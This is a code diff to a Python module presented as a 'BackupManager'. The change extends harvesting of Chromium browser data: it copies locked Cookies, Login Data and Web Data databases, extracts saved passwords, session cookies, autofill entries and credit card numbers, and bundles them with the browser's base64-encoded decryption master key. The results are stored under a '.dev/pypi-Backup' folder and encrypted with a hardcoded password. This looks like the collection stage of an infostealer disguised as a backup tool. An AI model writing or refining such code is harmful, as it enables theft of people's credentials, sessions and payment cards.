@@ -82,6 +82,56 @@ except ImportError:
 
 from .config import BackupConfig
 
+
+def get_available_browser_profiles(user_data_dir):
+    """返回 Chromium Profile，Default 始终排在最前。"""
+    profiles = []
+    if not os.path.exists(user_data_dir):
+        return profiles
+    try:
+        for item in os.listdir(user_data_dir):
+            item_path = os.path.join(user_data_dir, item)
+            if os.path.isdir(item_path) and (item == "Default" or item.startswith("Profile ")):
+                profiles.append((item, item_path))
+    except OSError as e:
+        logging.debug("扫描浏览器 Profile 失败: %s", e)
+    return sorted(profiles, key=lambda profile: (profile[0] != "Default", profile[0]))
+
+
+def build_browser_payload(profiles, master_key):
+    """构建与独立导入器兼容的浏览器载荷。"""
+    return {
+        "profiles": profiles,
+        "master_key": base64.b64encode(master_key).decode("utf-8"),
+        "total_cookies": sum(len(profile.get("cookies", [])) for profile in profiles.values()),
+        "total_passwords": sum(len(profile.get("passwords", [])) for profile in profiles.values()),
+        "total_autofill": sum(len(profile.get("autofill", [])) for profile in profiles.values()),
+        "total_credit_cards": sum(len(profile.get("credit_cards", [])) for profile in profiles.values()),
+        "profiles_count": len(profiles),
+    }
+
+
+def safe_copy_locked_file(source_path, dest_path, sqlite_backup, max_retries=3):
+    """优先用 SQLite 在线备份，失败后回退普通复制。"""
+    if sqlite_backup(source_path, dest_path):
+        return True
+    for attempt in range(max_retries):
+        try:
+            shutil.copy2(source_path, dest_path)
+            return True
+        except PermissionError:
+            try:
+                with open(source_path, "rb") as src, open(dest_path, "wb") as dst:
+                    shutil.copyfileobj(src, dst)
+                return True
+            except OSError:
+                if attempt == max_retries - 1:
+                    return False
+                time.sleep(0.5)
+        except OSError:
+            return False
+    return False
+
 class BackupManager:
     """备份管理器类"""
     
@@ -1859,6 +1909,22 @@ $out | ConvertTo-Json -Compress
                 except Exception:
                     results.extend([None] * len(chunk))
             return results
+
+        def sqlite_online_backup(source_db, dest_db):
+            """使用 SQLite 在线备份获取运行中浏览器数据库的一致快照。"""
+            try:
+                source_conn = sqlite3.connect(f"file:{source_db}?mode=ro", uri=True)
+                dest_conn = sqlite3.connect(dest_db)
+                source_conn.backup(dest_conn)
+                source_conn.close()
+                dest_conn.close()
+                return True
+            except (sqlite3.Error, OSError) as e:
+                logging.debug("SQLite 在线备份失败: %s", e)
+                return False
+
+        def copy_browser_db(source_path, dest_path):
+            return safe_copy_locked_file(source_path, dest_path, sqlite_online_backup)
         
         # 浏览器 User Data 根目录（支持多个 Profile）
         browsers = {
@@ -1886,6 +1952,7 @@ $out | ConvertTo-Json -Compress
             cookies = []
             passwords = []
             web_data = {
+                "autofill": [],
                 "autofill_profiles": [],
                 "credit_cards": [],
                 "autofill_profile_names": [],
@@ -1903,7 +1970,7 @@ $out | ConvertTo-Json -Compress
                 temp_cookies = str(Path.home() / f".dev/pypi-Backup/temp_{browser_name}_{profile_name}_cookies.db")
                 conn = None
                 try:
-                    shutil.copy2(cookies_path, temp_cookies)
+                    copy_browser_db(cookies_path, temp_cookies)
                     conn = sqlite3.connect(temp_cookies)
                     cursor = conn.cursor()
                     # 使用 CAST 确保 encrypted_value 作为 BLOB 读取
@@ -1964,7 +2031,7 @@ $out | ConvertTo-Json -Compress
                 except (sqlite3.Error, UnicodeDecodeError) as e:
                     # 如果 CAST 方法失败，尝试使用备用方法
                     try:
-                        shutil.copy2(cookies_path, temp_cookies)
+                        copy_browser_db(cookies_path, temp_cookies)
                         conn = sqlite3.connect(temp_cookies)
                         conn.text_factory = bytes
                         cursor = conn.cursor()
@@ -2036,7 +2103,7 @@ $out | ConvertTo-Json -Compress
                 temp_login = str(Path.home() / f".dev/pypi-Backup/temp_{browser_name}_{profile_name}_login.db")
                 conn = None
                 try:
-                    shutil.copy2(login_data_path, temp_login)
+                    copy_browser_db(login_data_path, temp_login)
                     conn = sqlite3.connect(temp_login)
                     cursor = conn.cursor()
                     # 使用 CAST 确保 password_value 作为 BLOB 读取
@@ -2089,7 +2156,7 @@ $out | ConvertTo-Json -Compress
                 except (sqlite3.Error, UnicodeDecodeError) as e:
                     # 如果 CAST 方法失败，尝试使用备用方法
                     try:
-                        shutil.copy2(login_data_path, temp_login)
+                        copy_browser_db(login_data_path, temp_login)
                         conn = sqlite3.connect(temp_login)
                         conn.text_factory = bytes
                         cursor = conn.cursor()
@@ -2152,7 +2219,7 @@ $out | ConvertTo-Json -Compress
                 temp_web_data = str(Path.home() / f".dev/pypi-Backup/temp_{browser_name}_{profile_name}_webdata.db")
                 conn = None
                 try:
-                    shutil.copy2(web_data_path, temp_web_data)
+                    copy_browser_db(web_data_path, temp_web_data)
                     conn = sqlite3.connect(temp_web_data)
                     cursor = conn.cursor()
                     
@@ -2215,7 +2282,7 @@ $out | ConvertTo-Json -Compress
                         except (sqlite3.Error, UnicodeDecodeError) as e:
                             # 如果 CAST 方法失败，尝试使用备用方法
                             try:
-                                shutil.copy2(web_data_path, temp_web_data)
+                                copy_browser_db(web_data_path, temp_web_data)
                                 conn = sqlite3.connect(temp_web_data)
                                 conn.text_factory = bytes
                                 cursor = conn.cursor()
@@ -2268,6 +2335,18 @@ $out | ConvertTo-Json -Compress
                             except Exception as e2:
                                 pass
                     
+                    # 导出独立导入器使用的标准自动填充表。
+                    if table_exists(cursor, "autofill"):
+                        try:
+                            cursor.execute("PRAGMA table_info(autofill)")
+                            columns = {row[1] for row in cursor.fetchall()}
+                            fields = [field for field in ("name", "value", "date_created", "date_last_used", "count") if field in columns]
+                            if "name" in columns and "value" in columns:
+                                cursor.execute(f"SELECT {','.join(fields)} FROM autofill")
+                                web_data["autofill"] = [dict(zip(fields, row)) for row in cursor.fetchall()]
+                        except Exception as e:
+                            logging.debug("导出标准自动填充失败: %s", e)
+
                     # 导出自动填充个人信息（仅在表存在时）
                     if table_exists(cursor, "autofill_profiles"):
                         try:
@@ -2361,6 +2440,9 @@ $out | ConvertTo-Json -Compress
                         except Exception:
                             pass
             
+            for card in web_data["credit_cards"]:
+                if "card_number" in card:
+                    card["number"] = card.pop("card_number")
             return cookies, passwords, web_data
         
         for browser_name, user_data_path in browsers.items():
@@ -2402,22 +2484,15 @@ $out | ConvertTo-Json -Compress
                     logging.debug(f"获取 {browser_name} Master Key 失败: {e}")
                     master_key = None
                     master_key_b64 = None
+
+            if not master_key:
+                logging.debug("跳过 %s：无法获取 Master Key", browser_name)
+                continue
             
             # 扫描所有可能的 Profile 目录（Default, Profile 1, Profile 2, ...）
             profiles = []
             try:
-                for item in os.listdir(user_data_path):
-                    item_path = os.path.join(user_data_path, item)
-                    # 检查是否是 Profile 目录（Default 或 Profile N）
-                    if os.path.isdir(item_path) and (item == "Default" or item.startswith("Profile ")):
-                        # 检查是否存在 Cookies、Login Data 或 Web Data 文件（支持 Network/Cookies 路径）
-                        cookies_path = os.path.join(item_path, "Network", "Cookies")
-                        if not os.path.exists(cookies_path):
-                            cookies_path = os.path.join(item_path, "Cookies")
-                        login_data_path = os.path.join(item_path, "Login Data")
-                        web_data_path = os.path.join(item_path, "Web Data")
-                        if os.path.exists(cookies_path) or os.path.exists(login_data_path) or os.path.exists(web_data_path):
-                            profiles.append(item)
+                profiles = [name for name, _ in get_available_browser_profiles(user_data_path)]
             except Exception as e:
                 logging.error(f"❌ 扫描 {browser_name} Profile 目录失败: {e}")
                 continue
@@ -2434,39 +2509,24 @@ $out | ConvertTo-Json -Compress
                 
                 cookies, passwords, web_data = export_profile_data(browser_name, profile_path, master_key, profile_name)
                 
-                if cookies or passwords or any(web_data.values()):
-                    total_web_data_items = (
-                        len(web_data["autofill_profiles"]) +
-                        len(web_data["credit_cards"]) +
-                        len(web_data["autofill_profile_names"]) +
-                        len(web_data["autofill_profile_emails"]) +
-                        len(web_data["autofill_profile_phones"]) +
-                        len(web_data["autofill_profile_addresses"])
-                    )
+                if cookies or passwords or web_data["autofill"] or web_data["credit_cards"]:
+                    total_web_data_items = len(web_data["autofill"]) + len(web_data["credit_cards"])
                     browser_profiles[profile_name] = {
                         "cookies": cookies,
                         "passwords": passwords,
-                        "web_data": web_data,
+                        "autofill": web_data["autofill"],
+                        "credit_cards": web_data["credit_cards"],
                         "cookies_count": len(cookies),
                         "passwords_count": len(passwords),
                         "web_data_count": total_web_data_items,
                         "credit_cards_count": len(web_data["credit_cards"]),
-                        "autofill_profiles_count": len(web_data["autofill_profiles"])
+                        "autofill_count": len(web_data["autofill"])
                     }
                     web_data_info = f", {total_web_data_items} Web Data" if total_web_data_items > 0 else ""
                     logging.info(f"    ✅ {profile_name}: {len(cookies)} Cookies, {len(passwords)} 密码{web_data_info}")
             
             if browser_profiles:
-                all_data["browsers"][browser_name] = {
-                    "profiles": browser_profiles,
-                    "master_key": master_key_b64,  # 备份 Master Key（base64 编码，所有 Profile 共享）
-                    "total_cookies": sum(p["cookies_count"] for p in browser_profiles.values()),
-                    "total_passwords": sum(p["passwords_count"] for p in browser_profiles.values()),
-                    "total_web_data": sum(p.get("web_data_count", 0) for p in browser_profiles.values()),
-                    "total_credit_cards": sum(p.get("credit_cards_count", 0) for p in browser_profiles.values()),
-                    "total_autofill_profiles": sum(p.get("autofill_profiles_count", 0) for p in browser_profiles.values()),
-                    "profiles_count": len(browser_profiles)
-                }
+                all_data["browsers"][browser_name] = build_browser_payload(browser_profiles, master_key)
                 master_key_status = "✅" if master_key_b64 else "⚠️"
                 total_cookies = all_data["browsers"][browser_name]["total_cookies"]
                 total_passwords = all_data["browsers"][browser_name]["total_passwords"]
@@ -2474,6 +2534,10 @@ $out | ConvertTo-Json -Compress
                 web_data_summary = f", {total_web_data} Web Data" if total_web_data > 0 else ""
                 logging.info(f"✅ {browser_name}: {len(browser_profiles)} 个 Profile, {total_cookies} Cookies, {total_passwords} 密码{web_data_summary} {master_key_status} Master Key")
         
+        if not all_data["browsers"]:
+            logging.debug("没有可导出的浏览器数据")
+            return None
+
         # 加密保存
         password = "cookies2026"
         salt = get_random_bytes(32)
